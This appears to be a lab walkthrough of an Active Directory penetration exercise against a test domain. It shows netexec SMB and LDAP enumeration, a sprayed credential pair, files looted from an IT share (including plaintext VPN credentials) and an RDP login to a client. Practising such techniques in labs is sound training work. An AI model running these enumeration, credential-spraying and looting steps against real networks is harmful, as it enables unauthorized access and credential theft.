``` sh
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.0.2.0/24                                     
SMB         10.0.2.9        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.1        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)
SMB         10.0.2.38       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)
SMB         10.0.2.39       445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)
```
![[Pasted image 20260818194216.png]]

spray the creds. Read access on client1 IT share
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD11/loot]
└─$ nxc-sweep 10.0.2.38 -u 'j.miller' -p 'Marines#1'
[*] Starting NXC sweep for 10.0.2.38 as j.miller ...
                                                                                                                                                                                                                   
[+] Port 445 open. Checking smb ...                                                                                                                                                                                
SMB         10.0.2.38       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)                                       
SMB         10.0.2.38       445    CLIENT-1         [+] hackerblueprint.local\j.miller:Marines#1 
SMB         10.0.2.38       445    CLIENT-1         [*] Enumerated shares
SMB         10.0.2.38       445    CLIENT-1         Share           Permissions     Remark
SMB         10.0.2.38       445    CLIENT-1         -----           -----------     ------
SMB         10.0.2.38       445    CLIENT-1         ADMIN$                          Remote Admin
SMB         10.0.2.38       445    CLIENT-1         C$                              Default share
SMB         10.0.2.38       445    CLIENT-1         IPC$            READ            Remote IPC
SMB         10.0.2.38       445    CLIENT-1         IT              READ            

```
![[Pasted image 20260818194623.png]]

grab the loot and get out
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD11/loot]
└─$ impacket-smbclient hackerblueprint.local/'j.miller':'Marines#1'@10.0.2.38
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
IT
# use IT
# tree
/handover.txt
/hosts_backup.txt
/old_vpn_creds.txt
Finished - 0 files and folders
# get handover.txt
# get hosts_backup.txt
# get old_vpn_creds.txt
# 

```
![[Pasted image 20260818194952.png]]

``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD11/loot]
└─$ ls
handover.txt  hosts_backup.txt  ips  nmap.txt  old_vpn_creds.txt  pass  usernames
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/writeups/ad/AD11/loot]
└─$ cat handover.txt 
IT Handover / migration notes
- Reporting portal (http://10.0.2.60:8081) is being decommissioned - ignore.
- Old fileserver FS01 (10.0.2.50) retired; some shares moved here temporarily.
- Do NOT touch svc_* accounts without a ticket.
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/writeups/ad/AD11/loot]
└─$ cat hosts_backup.txt 
10.0.2.9    dc01
10.0.2.50   fs01                # old fileserver (offline)
10.0.2.60   reporting-portal    # legacy, being removed
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/writeups/ad/AD11/loot]
└─$ cat old_vpn_creds.txt 
# Legacy VPN test account (DECOMMISSIONED - do not use in prod)
username: svc_vpn
password: WinterVPN#2021

```


username enum
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD11/loot]
└─$ netexec ldap 10.0.2.9 -u 'j.miller' -p 'Marines#1' --users
LDAP        10.0.2.9        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hackerblueprint.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.2.9        389    DC01             [+] hackerblueprint.local\j.miller:Marines#1 
LDAP        10.0.2.9        389    DC01             [*] Enumerated 16 domain users: hackerblueprint.local
LDAP        10.0.2.9        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.9        389    DC01             Administrator                 2026-06-10 04:38:25 0        Built-in account for administering the computer/domain      
LDAP        10.0.2.9        389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.0.2.9        389    DC01             krbtgt                        2026-06-30 07:32:47 0        Key Distribution Center Service Account                     
LDAP        10.0.2.9        389    DC01             j.miller                      2026-07-03 07:20:55 0        Helpdesk                                                    
LDAP        10.0.2.9        389    DC01             a.reed                        2026-07-03 07:20:55 0        Finance                                                     
LDAP        10.0.2.9        389    DC01             t.okoro                       2026-07-03 07:20:55 0        Automation                                                  
LDAP        10.0.2.9        389    DC01             svc_backup                    2026-07-03 07:20:55 0        Backup service account                                      
LDAP        10.0.2.9        389    DC01             s.patel                       2026-07-03 07:20:55 0                                                                    
LDAP        10.0.2.9        389    DC01             m.fisher                      2026-07-03 07:20:55 0                                                                    
LDAP        10.0.2.9        389    DC01             d.cole                        2026-07-03 07:20:55 0                                                                    
LDAP        10.0.2.9        389    DC01             r.nguyen                      2026-07-03 07:20:55 0        IT Support                                                  
LDAP        10.0.2.9        389    DC01             k.brooks                      2026-07-03 07:20:55 0        Sales                                                       
LDAP        10.0.2.9        389    DC01             l.romano                      2026-07-03 07:20:55 0        HR                                                          
LDAP        10.0.2.9        389    DC01             c.davies                      2026-07-03 07:20:56 0        Marketing                                                   
LDAP        10.0.2.9        389    DC01             p.andersen                    2026-07-03 07:20:56 0        Operations                                                  
LDAP        10.0.2.9        389    DC01             deploy_svc                    2026-07-03 07:20:56 0        Legacy deploy account   
```
![[Pasted image 20260818200659.png]]

got rdp access so rdp to client1
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD11/loot]
└─$ xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /u:'j.miller' /p:'Marines#1' /v:10.0.2.38:13389    
```

```sh
C:\Users\j.miller>whoami
hackerblueprint\j.miller

C:\Users\j.miller>hostname
CLIENT-1
```
![[Pasted image 20260818204152.png]]

